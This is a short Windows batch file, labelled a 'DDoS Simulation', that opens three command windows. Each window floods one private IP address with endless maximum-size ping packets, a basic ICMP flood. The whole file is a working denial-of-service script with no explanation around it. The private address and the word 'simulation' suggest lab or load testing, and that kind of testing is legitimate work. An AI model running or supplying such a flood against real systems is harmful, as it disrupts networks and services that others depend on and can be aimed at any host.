@echo off
title DDoS Simulation (Multi-Session ICMP Flood)
set TARGET_IP=10.230.4.202

echo Starting DDoS Simulation to %TARGET_IP%...
start cmd /k "ping %TARGET_IP% -t -l 65500"
start cmd /k "ping %TARGET_IP% -t -l 65500"
start cmd /k "ping %TARGET_IP% -t -l 65500"

